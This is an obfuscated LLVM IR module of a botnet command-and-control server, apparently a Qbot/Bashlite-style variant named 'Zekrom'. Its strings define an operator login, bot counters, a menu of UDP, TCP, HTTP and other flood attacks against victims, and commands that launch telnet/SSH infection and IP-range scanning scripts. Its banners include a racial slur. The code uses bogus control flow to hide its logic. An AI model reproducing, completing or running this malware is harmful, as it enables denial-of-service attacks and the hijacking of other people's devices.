; ModuleID = 'host/ir_bcf/Zekrom.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.telnetdata_t, [8 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [33 x i8] c"%c]0;BOT COUNT: %d| NIGGAS: %d%c\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@accounts = internal global [10 x %struct.login_info] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[30mUsername:\1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [21 x i8] c"\1B[30mPassword:\1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [28 x i8] c"\1B[31mWRONG ANSWER BITCH!!\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [107 x i8] c"\1B[31m _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD\EF\BF\BD____  _\EF\BF\BD\EF\BF\BD_ \EF\BF\BD  _\EF\BF\BD\EF\BF\BD_\EF\BF\BD\EF\BF\BD\EF\BF\BD_  _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD_ _\EF\BF\BD_\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [97 x i8] c"\1B[31m\EF\BF\BD     _\EF\BF\BD \EF\BF\BD  _\EF\BF\BD   \EF\BF\BD \EF\BF\BD  \EF\BF\BD _\EF\BF\BD \EF\BF\BD   \EF\BF\BD   \EF\BF\BD \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD \EF\BF\BD  \EF\BF\BD\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [99 x i8] c"\1B[31m\EF\BF\BD __\EF\BF\BD\EF\BF\BD     \EF\BF\BD_____  \EF\BF\BD  \EF\BF\BD\EF\BF\BD_  \EF\BF\BD  \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD  \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD    \EF\BF\BD\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [85 x i8] c"\1B[31m  \EF\BF\BD        \EF\BF\BD    \EF\BF\BD    \EF\BF\BD   \EF\BF\BD  _\EF\BF\BD    \EF\BF\BD  \EF\BF\BD_    _\EF\BF\BD   \EF\BF\BD    \EF\BF\BD \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [89 x i8] c"\1B[31m   \EF\BF\BD____\EF\BF\BD _\EF\BF\BD____   _\EF\BF\BD   \EF\BF\BD  \EF\BF\BD     \EF\BF\BD     \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD   _\EF\BF\BD   _\EF\BF\BD  \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [81 x i8] c"\1B[31m       \EF\BF\BD  \EF\BF\BD    \EF\BF\BD   \EF\BF\BD    \EF\BF\BD  \EF\BF\BD     \EF\BF\BD            \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [71 x i8] c"\1B[31m          \EF\BF\BD        \EF\BF\BD                          \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [39 x i8] c"\0D\0A\1B[34m\09\09~[\1B[31mWelcome, %s\1B[34m  ]~\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [41 x i8] c"\1B[34m\09\09~[\1B[31mBOT COUNT: %d\1B[34m\09   ]~\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [13 x i8] c"\1B[32m> \1B[37m\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.37 = private unnamed_addr constant [29 x i8] c"BOT COUNT: %d | NIGGAS: %d\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.39 = private unnamed_addr constant [41 x i8] c"TELNET DEVICES: %d | TELNET STATUS: %d\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"STATS\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"INFECT\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"python telnet.py filtered.txt\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"REINFECT\00", align 1
@.str.44 = private unnamed_addr constant [29 x i8] c"python w.py filtered_ssh.txt\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"FILTER\00", align 1
@.str.46 = private unnamed_addr constant [93 x i8] c"sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"LOAD\00", align 1
@.str.48 = private unnamed_addr constant [29 x i8] c"python scan.py 376 LOAD 88 1\00", align 1
@.str.49 = private unnamed_addr constant [6 x i8] c"SCAN1\00", align 1
@.str.50 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.92 lol\00", align 1
@.str.51 = private unnamed_addr constant [6 x i8] c"SCAN2\00", align 1
@.str.52 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.93 lol\00", align 1
@.str.53 = private unnamed_addr constant [6 x i8] c"SCAN3\00", align 1
@.str.54 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.25 1\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"SCAN4\00", align 1
@.str.56 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.26 1\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"SCAN5\00", align 1
@.str.58 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.27\091\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"SCAN6\00", align 1
@.str.60 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 113.53 1\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"SCAN7\00", align 1
@.str.62 = private unnamed_addr constant [31 x i8] c"python scan.py 376 B 180.180 1\00", align 1
@.str.63 = private unnamed_addr constant [6 x i8] c"SCAN8\00", align 1
@.str.64 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 185.52 1\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"LUCKY\00", align 1
@.str.66 = private unnamed_addr constant [30 x i8] c"python scan.py 376 LUCKY 88 1\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"LUCKY2\00", align 1
@.str.68 = private unnamed_addr constant [31 x i8] c"python scan.py 376 LUCKY2 88 1\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"SCAN_OFF\00", align 1
@.str.70 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.72 = private unnamed_addr constant [29 x i8] c"\0D\0A\1B[31m~[ATTACK COMMANDS]~\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [62 x i8] c"\1B[31m~[\1B[37mUDP\1B[31m]~ \1B[37m!* UDP Victim Port Time 32 0 10\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [66 x i8] c"\1B[31m~[\1B[37mTCP\1B[31m]~ \1B[37m!* TCP Victim Port Time 32 all 0 10\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [54 x i8] c"\1B[31m~[\1B[37mSTD\1B[31m]~ \1B[37m!* STD Victim Port Time\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [48 x i8] c"\1B[31m~[\1B[37mHTTP\1B[31m]~ \1B[37m!* HTTP Url Time\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mJUNK\1B[31m]~ \1B[37m!* JUNK Victim Port Time\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mHOLD\1B[31m]~ \1B[37m!* HOLD Victim Port Time\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [50 x i8] c"\1B[31m~[\1B[37mKILL\1B[31m]~ \1B[37m!* KILLATTK | KILL\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [29 x i8] c"\1B[31m~[SCANNING COMMANDS]~\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [36 x i8] c"\1B[31m~[\1B[37mLOAD\1B[31m]~ \1B[37mLOAD\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN1 | SCAN2 | SCAN3 | SCAN4\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN5 | SCAN6 | SCAN7 | SCAN8\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mLUCKY\1B[31m]~ \1B[37mLUCKY | LUCKY2\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mSTOP\1B[31m]~ \1B[37mSCAN_OFF\0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mGENERAL COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSHELL\1B[31m]~ \1B[37m!* SH\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [46 x i8] c"\1B[31m~[\1B[37mBOTS\1B[31m]~ \1B[37m!* BOTS | BOTS\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [52 x i8] c"\1B[31m~[\1B[37mSTATUS\1B[31m]~ \1B[37m!* STATUS | STATUS\0D\0A\00", align 1
@.str.90 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSTATS\1B[31m]~ \1B[37mSTATS\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [35 x i8] c"\1B[31m~[\1B[37mMISC COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mINECTION FILTER\1B[31m]~ \1B[37mFILTER\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mTELNET INFECT\1B[31m]~ \1B[37mINFECT\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mREINFECT BOTS\1B[31m]~ \1B[37mREINFECT\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [44 x i8] c"\1B[31m~[\1B[37mCLEARSCREEN\1B[31m]~ \1B[37mCLEAR\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mLOGOUT\1B[31m]~ \1B[37mLOGOUT\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.103 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.105 = private unnamed_addr constant [15 x i8] c"server_log.txt\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.110 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.112 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"LEL\00", align 1
@.str.119 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.121 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  %27 = load i32, i32* @x
  %28 = load i32, i32* @y
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %35 = load i32, i32* @x
  %36 = load i32, i32* @y
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %43, label %53

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %4, align 8
  %46 = load i32, i32* %7, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %8, align 4
  %51 = load i32, i32* %7, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %7, align 4
  br label %9

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* %8, align 4
  ret i32 %54

originalBBalteredBB:                              ; preds = %originalBB, %25
  br label %originalBB
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.1
  %21 = load i32, i32* @y.2
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* @x.1
  %31 = load i32, i32* @y.2
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:38:                                     ; preds = %10
  %39 = load i32, i32* @x.1
  %40 = load i32, i32* @y.2
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %38
  %47 = load i32, i32* @x.1
  %48 = load i32, i32* @y.2
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %55

; <label>:55:                                     ; preds = %70, %originalBBpart214
  %56 = load i32, i32* %5, align 4
  %57 = load i32, i32* %4, align 4
  %58 = icmp sge i32 %56, %57
  br i1 %58, label %59, label %68

; <label>:59:                                     ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = call i32 @isspace(i32 %65) #8
  %67 = icmp ne i32 %66, 0
  br label %68

; <label>:68:                                     ; preds = %59, %55
  %69 = phi i1 [ false, %55 ], [ %67, %59 ]
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %68
  %71 = load i32, i32* %5, align 4
  %72 = add nsw i32 %71, -1
  store i32 %72, i32* %5, align 4
  br label %55

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* %4, align 4
  store i32 %74, i32* %3, align 4
  br label %75

; <label>:75:                                     ; preds = %123, %73
  %76 = load i32, i32* @x.1
  %77 = load i32, i32* @y.2
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %75
  %84 = load i32, i32* %3, align 4
  %85 = load i32, i32* %5, align 4
  %86 = icmp sle i32 %84, %85
  %87 = load i32, i32* @x.1
  %88 = load i32, i32* @y.2
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %86, label %95, label %126

; <label>:95:                                     ; preds = %originalBBpart218
  %96 = load i32, i32* @x.1
  %97 = load i32, i32* @y.2
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %95
  %104 = load i8*, i8** %2, align 8
  %105 = load i32, i32* %3, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = load i8*, i8** %2, align 8
  %110 = load i32, i32* %3, align 4
  %111 = load i32, i32* %4, align 4
  %112 = sub nsw i32 %110, %111
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %109, i64 %113
  store i8 %108, i8* %114, align 1
  %115 = load i32, i32* @x.1
  %116 = load i32, i32* @y.2
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart223, label %originalBB20alteredBB

originalBBpart223:                                ; preds = %originalBB20
  br label %123

; <label>:123:                                    ; preds = %originalBBpart223
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %3, align 4
  br label %75

; <label>:126:                                    ; preds = %originalBBpart218
  %127 = load i8*, i8** %2, align 8
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %4, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %133 = load i32, i32* %4, align 4
  %_ = shl i32 %133, 1
  %_1 = shl i32 %133, 1
  %_2 = sub i32 %133, 1
  %gen = mul i32 %_2, 1
  %_3 = sub i32 %133, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %133, 1
  %_6 = sub i32 %133, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 0, %133
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 0, %133
  %gen11 = add i32 %_10, 1
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %4, align 4
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %38
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %75
  %135 = load i32, i32* %3, align 4
  %136 = load i32, i32* %5, align 4
  %137 = icmp sle i32 %135, %136
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %95
  %138 = load i8*, i8** %2, align 8
  %139 = load i32, i32* %3, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds i8, i8* %138, i64 %140
  %142 = load i8, i8* %141, align 1
  %143 = load i8*, i8** %2, align 8
  %144 = load i32, i32* %3, align 4
  %145 = load i32, i32* %4, align 4
  %_21 = shl i32 %144, %145
  %146 = sub nsw i32 %144, %145
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8, i8* %143, i64 %147
  store i8 %142, i8* %148, align 1
  br label %originalBB20
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %33

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* @x.3
  %18 = load i32, i32* @y.4
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  store i32 0, i32* %7, align 4
  %25 = load i32, i32* @x.3
  %26 = load i32, i32* @y.4
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %3
  %34 = load i32, i32* @x.3
  %35 = load i32, i32* @y.4
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i8*, i8** %4, align 8
  %43 = call i64 @strlen(i8* %42) #8
  %44 = add i64 %43, 10
  %45 = call noalias i8* @malloc(i64 %44) #7
  store i8* %45, i8** %8, align 8
  %46 = load i8*, i8** %8, align 8
  %47 = load i8*, i8** %4, align 8
  %48 = call i64 @strlen(i8* %47) #8
  %49 = add i64 %48, 10
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 %49, i32 1, i1 false)
  %50 = load i8*, i8** %8, align 8
  %51 = load i8*, i8** %4, align 8
  %52 = call i8* @strcpy(i8* %50, i8* %51) #7
  %53 = load i8*, i8** %8, align 8
  call void @trim(i8* %53)
